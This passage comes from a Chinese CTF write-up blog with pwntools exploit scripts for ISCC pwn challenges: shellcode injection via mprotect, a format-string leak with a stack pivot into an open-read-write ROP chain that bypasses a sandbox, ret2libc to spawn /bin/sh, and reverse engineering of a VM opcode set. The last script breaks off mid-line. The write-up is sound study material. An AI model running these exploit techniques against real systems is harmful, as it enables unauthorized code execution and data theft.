<li>让程序执行mprotect()，再read()读入到mprotect()的区域</li>
<li>read()读入shellcode来get_shell</li>
</ul>
<p>exp:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># time: 2025-05-14 21:54:30</span></span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">import <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">context</span>.<span class="title">terminal</span> =</span> [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">12800</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="meta"># libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s       = lambda data               :p.send(data)</span><br><span class="line">sa      = lambda delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :p.sendline(data)</span><br><span class="line">sla     = lambda delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = lambda                    :p.recvline()</span><br><span class="line">ru      = lambda delims             :p.recvuntil(delims)</span><br><span class="line">itr     = lambda                    :p.interactive()</span><br><span class="line">leak    = lambda name, addr         :<span class="built_in">log</span>.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.format(name, addr))</span><br><span class="line">hs256   = lambda data               :sha256(str(data).encode()).hexdigest()</span><br><span class="line">l32     = lambda                    :u32(p.recvuntil(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l64     = lambda                    :u64(p.recvuntil(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = lambda                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = lambda                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">int16   = lambda data               :<span class="type">int</span>(data, <span class="number">16</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;come to help herher&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">20</span>):</span><br><span class="line">    sl(b<span class="string">&#x27;saki,ido&#x27;</span>)</span><br><span class="line">    sl(str(<span class="number">0x100</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">payload = b<span class="string">&#x27;saki,stop&#x27;</span>.ljust(<span class="number">0x20</span>, b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>) + p64(<span class="number">0x1011</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x1</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xb0e78948</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xf780f934</span>)</span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\xc1\xe0\x08\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x31\xc6\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x6a\x07\x5a\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x31\xc0\x52\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x58\x04\x03\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x0f\x05\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x87\xf7\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x87\xd7\x80\xf7&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\x5f\x0f\x05\xb3&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + b<span class="string">&#x27;\xff\xe4\x00\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x114900</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x000001b8</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;\x90&#x27;</span> * <span class="number">0x10</span> + <span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="Dilemma"><a href="#Dilemma" class="headerlink" title="Dilemma"></a>Dilemma</h2><p>栈迁移+fmt+orw</p>
<p>在自定义的init()函数中开启了沙箱</p>
<p><img data-src="/../images/image-20250517141351937.png" alt="image-20250517141351937"></p>
<p>可以看到禁用了sys_number和execve，那就只能用orw来读flag</p>
<p>在看menu()函数，看到这个dummy()中什么都没有那就是设计的gadgets了</p>
<p><img data-src="/../images/image-20250517141407851.png" alt="image-20250517141407851"></p>
<p>查看func_1()</p>
<p><img data-src="/../images/image-20250517141458439.png" alt="image-20250517141458439"></p>
<p>这里有两次输入，而且第二个只能用一次，有溢出</p>
<p>在func_0中明显存在溢出</p>
<p><img data-src="/../images/image-20250517141515421.png" alt="image-20250517141515421"></p>
<p>在iscc中flag文件名为flag或flag.txt</p>
<p>查找gadgets</p>
<p><img data-src="/../images/image-20250517141323897.png" alt="image-20250517141323897"></p>
<p>缺少了rdx的gadgets，在libc文件中找通过泄露可以libc为libc6_2.35-0ubuntu3.8_amd64.so</p>
<p><img data-src="/../images/image-20250517141303474.png" alt="image-20250517141303474"></p>
<p>思路：</p>
<ul>
<li>在func_1()中泄露canary和libc</li>
<li>进入func_0()中栈迁移到bss段，将flag.txt写入</li>
<li>在rop回到func_0()中栈溢出写入orw</li>
</ul>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-16 08:10:06</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12500</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6_2.35-0ubuntu3.8_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript = &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040119a</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">bss = <span class="number">0x404000</span> + <span class="number">0x900</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x000000000040119c</span></span><br><span class="line">sla(<span class="string">b&quot;where are you go?&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">fmt = <span class="string">b&#x27;%39$p%11$p&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">b&quot;Enter you password:&quot;</span>,fmt)</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_start = int16(r(<span class="number">12</span>)) - <span class="number">128</span></span><br><span class="line">libc_base = libc_start- libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">again = <span class="number">0x4012BA</span></span><br><span class="line">canary = int16(r(<span class="number">16</span>))</span><br><span class="line">sla(<span class="string">b&quot;your password:&quot;</span>,<span class="string">b&quot;111&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;where are you go?&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(canary) + p64(bss+<span class="number">0x30</span>) + p64(<span class="number">0x4011C9</span>)</span><br><span class="line">sla(<span class="string">b&quot;to talk about&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">orw = <span class="string">b&#x27;./flag.txt&#x27;</span></span><br><span class="line">orw = orw.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(bss) +p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(bss+<span class="number">0x200</span>) + p64(<span class="number">0</span>) +p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(bss+<span class="number">0x200</span>) + p64(<span class="number">0</span>) +p64(pop_rdx_r12) + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(orw)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sl(orw)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="call"><a href="#call" class="headerlink" title="call"></a>call</h2><p>ret2libc，泄露的write地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-01 15:06:07</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>,<span class="number">12100</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc6_2.31-0ubuntu9.17_amd64.so&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">padding = <span class="number">0x60</span>+<span class="number">8</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401273</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000401271</span> </span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*padding + p64(pop_rdi_ret) +p64(<span class="number">1</span>)</span><br><span class="line">payload1 += p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(main)</span><br><span class="line">sl(payload1)</span><br><span class="line">write = l64()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*padding + p64(pop_rdi_ret) +p64(bin_sh) + p64(system)</span><br><span class="line">sl(payload2)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="vm-pwn"><a href="#vm-pwn" class="headerlink" title="vm_pwn"></a>vm_pwn</h2><p>逆向记录：</p>
<ul>
<li>0x4090 memory</li>
<li>0x4098 read(0, opcode, 0x1000uLL);的返回值—-&gt;ax</li>
</ul>
<blockquote>
<p>read() 函数的返回值含义如下：</p>
<ul>
<li><p>返回值为正整数：表示实际读取到的字节数。</p>
</li>
<li><p>返回值为0：表示已到达文件末尾（EOF），没有更多数据可读。</p>
</li>
<li><p>返回值为-1：表示读取失败，发生了错误（此时可以通过 errno 查看具体错误原因）。</p>
</li>
</ul>
</blockquote>
<ul>
<li>0x4060 array</li>
</ul>
<h3 id="指令集逆向解析"><a href="#指令集逆向解析" class="headerlink" title="指令集逆向解析"></a><strong>指令集逆向解析</strong></h3><h4 id="1-基础指令"><a href="#1-基础指令" class="headerlink" title="1. 基础指令"></a><strong>1. 基础指令</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x00</strong></td>
<td align="center"><code>LOAD_CONST</code></td>
<td align="center"><code>目标寄存器地址</code></td>
<td align="center">从内存加载常量到目标寄存器（<code>sub_132C</code>读取8字节）</td>
<td align="center"><code>case 0u</code></td>
</tr>
<tr>
<td align="center"><strong>0x01</strong></td>
<td align="center"><code>LOAD_MEM</code></td>
<td align="center"><code>源地址, 目标地址</code></td>
<td align="center">从内存地址加载值到寄存器（<code>*reg[v12]</code>解引用操作）</td>
<td align="center"><code>case 1u</code></td>
</tr>
<tr>
<td align="center"><strong>0x02</strong></td>
<td align="center"><code>STORE_MEM</code></td>
<td align="center"><code>目标地址, 源值</code></td>
<td align="center">将寄存器值存储到内存地址（<code>*reg[fetch] = reg[v11]</code>）</td>
<td align="center"><code>case 2u</code></td>
</tr>
<tr>
<td align="center"><strong>0x03</strong></td>
<td align="center"><code>MOV</code></td>
<td align="center"><code>目标寄存器, 源值</code></td>
<td align="center">寄存器间数据传输（直接复制值）</td>
<td align="center"><code>case 3u</code></td>
</tr>
<tr>
<td align="center"><strong>0x09</strong></td>
<td align="center"><code>NOP</code></td>
<td align="center">无</td>
<td align="center">空操作</td>
<td align="center"><code>case 9u</code></td>
</tr>
</tbody></table>
<h4 id="2-控制流指令"><a href="#2-控制流指令" class="headerlink" title="2. 控制流指令"></a><strong>2. 控制流指令</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x04</strong></td>
<td align="center"><code>CALL</code></td>
<td align="center">无</td>
<td align="center">调用子函数（<code>sub_1393</code>压栈返回地址）</td>
<td align="center"><code>case 4u</code></td>
</tr>
<tr>
<td align="center"><strong>0x07</strong></td>
<td align="center"><code>JMP</code></td>
<td align="center"><code>目标地址</code></td>
<td align="center">直接跳转到目标地址（修改PC指针）</td>
<td align="center"><code>case 7u</code></td>
</tr>
<tr>
<td align="center"><strong>0x08</strong></td>
<td align="center"><code>EXIT</code></td>
<td align="center">无</td>
<td align="center">退出虚拟机（返回主函数）</td>
<td align="center"><code>case 8u</code></td>
</tr>
</tbody></table>
<h4 id="3-运算指令"><a href="#3-运算指令" class="headerlink" title="3. 运算指令"></a><strong>3. 运算指令</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x0A</strong></td>
<td align="center"><code>ADD</code></td>
<td align="center"><code>目标寄存器</code></td>
<td align="center">对目标寄存器做加法（<code>reg[v9] += sub_132C(reg)</code>）</td>
<td align="center"><code>case 0xAu</code></td>
</tr>
<tr>
<td align="center"><strong>0x0B</strong></td>
<td align="center"><code>SUB</code></td>
<td align="center"><code>目标寄存器</code></td>
<td align="center">对目标寄存器做减法（<code>reg[v8] -= sub_132C(reg)</code>）</td>
<td align="center"><code>case 0xBu</code></td>
</tr>
</tbody></table>
<h4 id="4-高级操作"><a href="#4-高级操作" class="headerlink" title="4. 高级操作"></a><strong>4. 高级操作</strong></h4><table>
<thead>
<tr>
<th align="center">Opcode</th>
<th align="center">指令名称</th>
<th align="center">参数</th>
<th align="center">功能描述</th>
<th align="center">对应代码位置</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>0x05</strong></td>
<td align="center"><code>PUSH</code></td>
<td align="center"><code>值</code></td>
<td align="center">将值压入栈（通过<code>sub_1432</code>实现栈增长）</td>
<td align="center"><code>case 5u</code></td>
</tr>
<tr>
<td align="center"><strong>0x06</strong></td>
<td align="center"><code>CALL_FUNCTION</code></td>
<td align="center"><code>函数指针</code></td>
<td align="center">调用外部函数（<code>v14(*reg)</code>执行函数指针）</td>
<td align="center"><code>case 6u</code></td>
</tr>
</tbody></table>
<p>在\x01和\x02存在数组溢出，got表不可写，先获得data段0x4008的地址此处指向是base+0x4008，可以间接计算got</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-02 17:17:51</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.155.151&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,gdbscript)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	b *$rebase(0x14F3)\nb *$rebase(0x15ac)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">\x00: mov reg[op2],num ---&gt; heap_ptr+pc</span></span><br><span class="line"><span class="string">\x01: mov reg[op3],[mem]---&gt;*reg[op2]</span></span><br><span class="line"><span class="string">\x02: mov [mem]---&gt;*reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x03: mov reg[op3],reg[op2]</span></span><br><span class="line"><span class="string">\x04: push</span></span><br><span class="line"><span class="string">\x05: pop</span></span><br><span class="line"><span class="string">\x06: call---&gt;op3(reg[0])函数调用</span></span><br><span class="line"><span class="string">\x07: ret ---&gt; pop ip</span></span><br><span class="line"><span class="string">\x08: exit</span></span><br><span class="line"><span class="string">\x09: nop</span></span><br><span class="line"><span class="string">\x0a: add reg[op2],num</span></span><br><span class="line"><span class="string">\x0b: sub reg[op2],num</span></span><br><span class="line"><span class="string">op2均为src，op3均为dst</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># \x00</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_num</span>(<span class="params">reg, num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;bbQ&quot;</span>, <span class="number">0</span>, reg, num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># \x01</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_indirect</span>(<span class="params">src_reg, dst_reg</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span 